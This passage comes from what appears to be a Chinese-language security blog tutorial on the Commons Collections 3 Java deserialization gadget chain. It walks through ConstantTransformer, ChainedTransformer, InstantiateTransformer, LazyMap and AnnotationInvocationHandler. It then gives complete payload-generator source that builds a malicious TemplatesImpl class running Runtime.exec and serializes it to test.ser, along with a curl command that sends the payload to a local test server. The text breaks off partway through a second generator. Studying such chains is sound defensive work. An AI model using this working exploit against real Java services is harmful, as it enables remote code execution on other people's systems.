<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        InstantiateTransformer initiateTransformer= <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"><span class="comment">//传入参数类型是Templates Class，传入arguements为templates</span></span><br><span class="line">        initiateTransformer.transform(TrAXFilter.class);<span class="comment">//传入input为TrAxFilter.class</span></span><br></pre></td></tr></table></figure>

<p>计算器成功弹出！</p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>我们在cc1中使用到了这个方法，它让我们可以将几条transformer串联起来，并用上一个<code>transfomer.transform(intput)</code>的返回值作为<strong>下一个</strong><code>transfomer.transform(input)</code>中的<strong>input</strong>进行执行。</p>
<p>这里我们再简单的复习一遍</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;<span class="comment">//我们可以构造transformers</span></span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;<span class="comment">//依次循环每个transformer,当前transformer.transform(object)的返回值会直接变成下一个transformer.trnasform(object)中的object</span></span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是，我们还差一个开头的transformer。 <code>TrAXFilter.getConstructor.newInstance()</code>中的<code>TrAXFilter</code>类，我们需要想办法让他也能用<code>ChainedTransformer</code>连接起来，而不是手动去用<code>.transform(input)</code>作为<code>input</code>传入进去。</p>
<p><strong>方法一：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="comment">/* 这里需要添加一个transformer，让他能够返回TrAXFilter class，作为下一个transformer的input */</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="comment">/* 这里需要添加一个transformer，让他能够返回TrAXFilter class，作为下一个transformer的input */</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>我们最终选择使用我们在cc1中用到的<code>ConstantTransformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个类，我们可以将<code>TrAXFilter</code>类传进去，作为<code>transformers</code>的开头，这样我们的链就串上了！</p>
<p><strong>方法一：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(trAXFilterClass),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;1&quot;</span>);<span class="comment">//触发第一条ConstantTransformer，传入参数随便写，不影响，因为ConstantTrnasformer的transform函数不会用到它自己的input参数</span></span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;1&quot;</span>);<span class="comment">//触发第一条ConstantTransformer，传入参数随便写，不影响，因为ConstantTrnasformer的transform函数不会用到它自己的input参数</span></span><br></pre></td></tr></table></figure>

<p>计算器执行成功。</p>
<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><span id="lazyMap">ps：CC1的LazyMap及之后的部分也和这个一样。</span></p>
<p>接下来我们需要寻找触发<code>ChainedTrasnformer.transform()</code>的方法。在CC1链中，我们用到了<code>LazyMap.get()</code>，其中invoke了<code>transform()</code>方法。当我们把<code>factory</code>赋值为<code>chainedTransformer</code>就可以触发其<code>transform()</code>方法了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但因为<code>LazyMap</code>的constructor是protected的，所以我们不能直接构造，我们发现LazyMap的decorate()方法可以返回一个instance：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map,chainedTransformer);<span class="comment">//得到lazyMap instance</span></span><br></pre></td></tr></table></figure>

<p>那么怎样触发LazyMap.get()方法呢？最好是readObject内部可以用到的。</p>
<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>我们发现在<code>AnnotationInvocationHandler</code>中的<code>invoke()</code>调用了<code>memberValues.get(member)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;hashCode&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;annotationType&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);<span class="comment">//这里调用了get()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">        result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们把memberValues的值改为Lazymap对象，那么我们就可以触发漏洞了。</p>
<p>我们可以通过AnnotationInvocationHandler的构造函数来达到这个目的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但尝试后发现并不能直接创建对象</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/image-20211201153006916.png" alt="image-20211201153006916"> </p>
<p>因为AnnotationInvocationHandler无法直接访问，于是我们使用反射方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">classToSerialize</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line"><span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">secondInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);<span class="comment">//AnnotationInvocationHandler是实现InvocationHandler类的，我们可以直接把他转化为InvocationHandler类，传入我们的lazyMap</span></span><br></pre></td></tr></table></figure>

<p>但我们应该如何call到<code>secondInvocationHandler</code>的<code>invoke()</code>方法呢?</p>
<h4 id="动态代理-InvocationHandler-amp-AnnotationInvocationHandler"><a href="#动态代理-InvocationHandler-amp-AnnotationInvocationHandler" class="headerlink" title="动态代理 - InvocationHandler &amp; AnnotationInvocationHandler"></a>动态代理 - InvocationHandler &amp; AnnotationInvocationHandler</h4><p><a href="https://leihehehe.github.io/2021/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/">Java反序列化漏洞之静态代理与动态代理(5)</a>中已经详细讲解过，此处的<code>InvocationHandler</code>接口其实就是负责提供调用代理操作，在动态代理中，一个代理类必须要实现<code>InvocationHandler</code>类，从而每当客户调用代理类动态生成的代理instance的方法的时候，<strong>都会被转发</strong>至代理类的<code>invoke()</code>方法。我们得知<code>AnnotationInvocationHandler implements InvocationHandler</code>，是否意味着，<code>AnnotationInvocationHandler</code>就可以作为一个代理类呢？</p>
<p>如果我们用<code>AnnotationInvocationHandler</code>代理类动态生成一个代理A，再去访问代理A的方法，我们就可以自动call到代理类<code>AnnotationInvocationHandlers</code>中的<code>invoke()</code>方法了</p>
<p>如果这个代理A是一个HashMap，那么我们只要执行了这个创建的代理HashMap的任意一个function，都能触发命令。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建代理类的实例</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">InvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, lazyMap);</span><br><span class="line"><span class="comment">//创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">testMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);</span><br></pre></td></tr></table></figure>

<h4 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h4><p>我们注意到<code>AnnotationInvocationHandler</code>有它自己的<code>readObject()</code>，这意味着，如果我们把它作为序列化object传给服务器，服务器在反序列化时会执行其<code>readObject()</code>方法。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201161957159.png" alt="image-20211201161957159"></p>
<p>经过分析，我们非常清楚，<code>memberValues</code>是可控的，可以通过反射构造函数来控制。如果我们将<code>memberValues</code>设置为我们上一步生成的代理<code>evilMap</code>，那么意味着，反序列化时我们就可以完成整条攻击链了！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建代理类的实例</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">InvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, lazyMap);</span><br><span class="line"><span class="comment">//创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">testMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);</span><br><span class="line"><span class="comment">//创建第二个代理类的实例</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">anotherInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, evilMap);</span><br><span class="line"><span class="comment">/* 写出序列化文件 */</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">outputStream.writeObject(anotherInvocationHandler);</span><br><span class="line">outputStream.close();</span><br></pre></td></tr></table></figure>

<p>用web环境实验一下:<code>curl http://localhost:9090/webTest1_Web_exploded/test --data-binary @test.ser</code></p>
<p>计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201162910487.png" alt="image-20211201162910487"></p>
<h3 id="Payload构造-2"><a href="#Payload构造-2" class="headerlink" title="Payload构造"></a>Payload构造</h3><h4 id="方法一-InvokerTransformer"><a href="#方法一-InvokerTransformer" class="headerlink" title="方法一 InvokerTransformer"></a>方法一 InvokerTransformer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 生成字节码 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//必须要继承AbstractTranslet类</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line">        <span class="comment">/* TemplatesImpl加载字节码 */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();<span class="comment">//创建一个templates对象</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">trAXFilterClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(trAXFilterClass),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">classToSerialize</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建代理类的实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">InvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, lazyMap);</span><br><span class="line">        <span class="comment">//创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">testMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);</span><br><span class="line">        <span class="comment">//创建第二个代理类的实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">anotherInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, evilMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 写出序列化文件 */</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">        outputStream.writeObject(anotherInvocationHandler);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="方法二-InstantiateTransformer"><a href="#方法二-InstantiateTransformer" class="headerlink" title="方法二 InstantiateTransformer"></a>方法二 InstantiateTransformer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> 